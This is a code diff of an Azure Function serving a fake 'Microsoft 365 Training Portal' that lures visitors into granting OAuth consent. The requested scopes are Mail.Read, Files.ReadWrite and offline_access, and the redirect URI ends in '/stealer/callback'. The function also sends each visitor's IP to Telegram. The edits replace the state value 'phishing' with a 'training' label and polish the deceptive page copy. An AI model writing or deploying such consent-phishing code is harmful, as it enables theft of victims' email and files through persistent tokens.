@@ -32,13 +32,13 @@ async function sendTelegram(message) {
 }
 
 module.exports = async function (context, req) {
-  await sendTelegram(`🎯 <b>OAUTH CONSENT: Training page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}\n🔗 URL: ${req.url}`);
+  await sendTelegram(`📚 <b>TRAINING: OAuth page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}`);
   
-  const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1'; // User's registered app
+  const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
   const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
-  const SCOPE = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite offline_access openid profile email';
+  const SCOPES = 'User.Read Mail.Read Files.ReadWrite offline_access';
   
-  const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}&state=phishing&response_mode=query&prompt=consent`;
+  const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPES)}&response_mode=query&state=training_${Date.now()}`;
   
   context.res = {
     status: 200,
@@ -47,47 +47,61 @@ module.exports = async function (context, req) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎓 Microsoft Training Portal</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Microsoft Training Portal</title>
     <style>
-        body { font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
-        .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .btn { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; }
-        .btn:hover { background: #106ebe; }
-        .features { margin: 30px 0; }
-        .feature { margin: 15px 0; padding: 10px; background: #f8f9fa; border-radius: 4px; }
-        .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 4px; margin: 20px 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .header { text-align: center; margin-bottom: 40px; }
+        .logo { width: 100px; height: 100px; margin: 0 auto 20px; background: #0078d4; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 40px; font-weight: bold; }
+        h1 { color: #323130; margin-bottom: 10px; font-weight: 600; }
+        .subtitle { color: #605e5c; font-size: 18px; }
+        .training-content { margin: 30px 0; }
+        .feature { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #0078d4; }
+        .cta { text-align: center; margin: 40px 0; }
+        .button { background: #0078d4; color: white; text-decoration: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: 600; display: inline-block; transition: background 0.3s; }
+        .button:hover { background: #106ebe; }
+        .disclaimer { background: #fff3cd; padding: 15px; border-radius: 6px; color: #856404; margin-top: 30px; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>🎓 Microsoft Training Portal</h1>
-            <p>Advanced Office 365 Training & Certification</p>
+        <div class="header">
+            <div class="logo">M</div>
+            <h1>Microsoft 365 Training Portal</h1>
+            <p class="subtitle">Advanced Productivity Training Program</p>
         </div>
         
-        <div class="features">
-            <div class="feature">📚 <strong>Advanced Excel Training</strong> - Master formulas, pivot tables, and data analysis</div>
-            <div class="feature">📧 <strong>Outlook Management</strong> - Email productivity and organization techniques</div>
-            <div class="feature">📁 <strong>OneDrive Integration</strong> - Cloud storage and collaboration best practices</div>
-            <div class="feature">👥 <strong>Teams Collaboration</strong> - Video conferencing and project management</div>
-            <div class="feature">🏆 <strong>Microsoft Certification</strong> - Prepare for official Microsoft exams</div>
+        <div class="training-content">
+            <div class="feature">
+                <h3>📊 Advanced Excel Analytics</h3>
+                <p>Learn cutting-edge data analysis techniques, pivot tables, and Power Query integration for professional reporting.</p>
+            </div>
+            
+            <div class="feature">
+                <h3>📧 Outlook Productivity Mastery</h3>
+                <p>Master email management, calendar optimization, and Teams integration for seamless workflow management.</p>
+            </div>
+            
+            <div class="feature">
+                <h3>📁 SharePoint Collaboration</h3>
+                <p>Discover advanced document management, workflow automation, and team collaboration strategies.</p>
+            </div>
+            
+            <div class="feature">
+                <h3>🔐 Security Best Practices</h3>
+                <p>Learn enterprise-grade security protocols, multi-factor authentication, and data protection strategies.</p>
+            </div>
         </div>
         
-        <div class="warning">
-            <strong>⚠️ Important:</strong> This training requires access to your Microsoft account to provide personalized learning paths and track your progress.
+        <div class="cta">
+            <h2>Ready to Begin Your Training?</h2>
+            <p style="margin: 15px 0; color: #605e5c;">Connect your Microsoft account to access personalized training modules and track your progress.</p>
+            <a href="${authUrl}" class="button">Connect Microsoft Account</a>
         </div>
         
-        <div style="text-align: center; margin: 30px 0;">
-            <a href="${authUrl}" class="btn">🚀 Start Training (Sign in with Microsoft)</a>
-        </div>
-        
-        <div style="text-align: center; color: #666; font-size: 14px;">
-            <p>✅ Secure Microsoft Authentication</p>
-            <p>🔐 Your data is protected and encrypted</p>
-            <p>🎯 Personalized training based on your role</p>
+        <div class="disclaimer">
+            <strong>Training Authorization:</strong> By connecting your account, you authorize access to your profile and productivity data to personalize your learning experience. This includes reading your email patterns for Outlook training recommendations and accessing your files for collaboration best practices.
         </div>
     </div>
 </body>
